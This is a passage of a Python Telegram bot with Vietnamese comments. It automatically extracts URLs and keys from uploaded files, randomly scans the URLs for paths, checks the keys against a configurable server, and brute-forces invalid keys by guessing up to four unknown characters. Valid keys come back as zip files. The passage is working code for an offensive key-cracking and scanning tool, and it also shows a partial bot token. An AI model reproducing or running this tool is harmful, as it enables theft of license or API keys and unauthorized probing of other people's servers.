📂 Files: {stats['total_files']}
👥 Users: {stats['active_users']}""")

@bot.on(events.NewMessage(pattern='/stats'))
async def cmd_stats(event):
    await event.reply(f"""📊 **THỐNG KÊ**
• Keys: {stats['keys_checked']} checked / {stats['valid_keys_found']} valid
• Scans: {stats['scans_done']} + {stats['random_scans']} random
• Crack: {stats['total_crack_attempts']} attempts
• Files: {stats['total_files']}
• Users: {stats['active_users']}""")

@bot.on(events.NewMessage(pattern='/setserver'))
async def cmd_setserver(event):
    uid=event.sender_id; p=event.text.split()
    if len(p)<4: await event.reply("⚠️ `/setserver [url] [param] [marker]`"); return
    set_setting(uid,'server_url',p[1]); set_setting(uid,'param_name',p[2]); set_setting(uid,'success_marker',p[3])
    stats['server_url']=p[1]; await event.reply(f"✅ Đã cấu hình: `{p[1]}`")

@bot.on(events.NewMessage(pattern='/servers'))
async def cmd_servers(event):
    t="📋 **SERVER MẪU:**\n"
    for n,c in DEFAULT_SERVERS.items(): t+=f"• **{n}** → `{c['url']}`\n"
    t+="\n`/useserver [tên]`"; await event.reply(t)

@bot.on(events.NewMessage(pattern='/useserver'))
async def cmd_useserver(event):
    uid=event.sender_id; p=event.text.split()
    if len(p)<2: await event.reply("⚠️ `/useserver [tên]`"); return
    n=p[1].lower()
    if n not in DEFAULT_SERVERS: await event.reply("❌ `/servers`"); return
    c=DEFAULT_SERVERS[n]; set_setting(uid,'server_url',c['url']); set_setting(uid,'param_name',c['param']); set_setting(uid,'success_marker',c['marker'])
    stats['server_url']=c['url']; await event.reply(f"✅ **{n}**")

@bot.on(events.NewMessage(pattern='/setthread'))
async def cmd_thread(event):
    uid=event.sender_id; p=event.text.split()
    if len(p)<2: await event.reply(f"⚠️ `/setthread [1-100]` Hiện: {get_setting(uid,'thread_count',10)}"); return
    try:
        n=int(p[1])
        if 1<=n<=100: set_setting(uid,'thread_count',n); await event.reply(f"✅ {n} threads")
    except: pass

# =====================================================================
# XỬ LÝ FILE - AUTO EVERYTHING
# =====================================================================
@bot.on(events.NewMessage(incoming=True))
async def file_handler(event):
    msg=event.message
    if msg.text and msg.text.startswith('/'): return
    if not (msg.media and isinstance(msg.media,MessageMediaDocument)): return
    
    doc=msg.media.document
    fname="unknown.txt"; fsize=doc.size
    for attr in doc.attributes:
        if isinstance(attr,DocumentAttributeFilename): fname=attr.file_name; break
    
    ext=os.path.splitext(fname)[1].lower()
    if ext not in SUPPORTED_EXTENSIONS:
        if msg.text: return
        return
    
    uid=event.sender_id; cid=event.chat_id
    active_users_set.add(uid); stats['active_users']=len(active_users_set)
    stats['total_files']+=1
    
    sm=await event.reply(f"📥 **{fname}** ({fsize/1024:.1f}KB)\n⏳ Đang trích xuất URL + Key...")
    sp=os.path.join("./downloads/",f"{uid}_{int(time.time())}_{fname}")
    try: await msg.download_media(file=sp)
    except Exception as e: await sm.edit(f"❌ Lỗi tải: {e}"); return
    
    # Trích xuất URL và Key
    urls=extract_urls_from_file_comprehensive(sp)
    keys=extract_keys_from_file_comprehensive(sp)
    
    report=f"📂 **{fname}**\n"
    report+=f"🔗 URL tìm thấy: **{len(urls)}**\n"
    report+=f"🔑 Key tìm thấy: **{len(keys)}**\n\n"
    
    # Random scan nếu có URL
    scan_results=None
    if urls:
        count=get_setting(uid,'random_scan_count',5)
        scan_count=min(count,len(urls))
        report+=f"🎲 Đang scan ngẫu nhiên {scan_count} URL...\n"
        await sm.edit(report)
        scan_results=run_random_scan(urls,uid,scan_count)
        report+=f"✅ Scan xong: {len(scan_results)} URL\n\n"
    
    # Check key nếu có
    if keys:
        report+=f"🔍 Đang check {len(keys)} keys...\n"
        await sm.edit(report)
        valid=run_key_check(keys,uid)
        report+=f"✅ Valid: **{len(valid)}/{len(keys)}**\n"
        
        if valid:
            zp,_=create_pack(valid,fname)
            await bot.send_file(cid,zp,caption=f"📦 {fname} | ✅ {len(valid)} valid keys")
        
        # Auto crack nếu bật
        if get_setting(uid,'auto_crack',True) and len(valid)<len(keys):
            invalid=[k for k in keys if k not in valid]
            if invalid:
                pattern=auto_detect_pattern(invalid)
                if pattern and pattern.count('X')<=4:
                    report+=f"🤖 Auto crack: `{pattern}`...\n"
                    await sm.edit(report)
                    c_valid,_=run_crack(pattern,uid)
                    if c_valid:
                        czp,_=create_pack(c_valid,f"autocrack_{fname}")
                        await bot.send_file(cid,czp,caption=f"🤖 Auto Crack | ✅ {len(c_valid)} keys")
                        report+=f"✅ Auto crack: {len(c_valid)} keys\n"
    
    if scan_results:
        report+=f"\n🔍 **Scan Results:**\n"
        for i,r in enumerate(scan_results[:5],1):
            report+=f"  {i}. `{r['target']}` - {len(r.get('paths',[]))} paths\n"
    
    await sm.edit(report[:4000])
    try: os.remove(sp)
    except: pass

# =====================================================================
# MAIN
# =====================================================================
async def main():
    print("""╔══════════════════════════════════════╗
║ BOT AUTO SCAN RANDOM & CRACK 24/7  ║
║ Token: 6320148381:AAFx...          ║
╚══════════════════════════════════════╝""")
    threading.Thread(target=run_web,daemon=True).start()
    threading.Thread(target=auto_ping,daemon=True).start()
    await bot.start(bot_token=BOT_TOKEN)
    me=await bot.get_me()
    stats['bot_username']=f"@{me.username}"
    print(f"[✓] Bot: @{me.username}")
    print(f"[✓] Web: http://0.0.0.0:{WEB_PORT}")
    print(f"[✓] Sẵn sàng 24/7!\n")
    await bot.run_until_disconnected()

if __name__=="__main__":
    import warnings; warnings.filterwarnings("ignore")
    try: asyncio.run(main())
    except KeyboardInterrupt: print("\n[!] Dừng.")
    except Exception as e: print(f"\n[!] {e}")
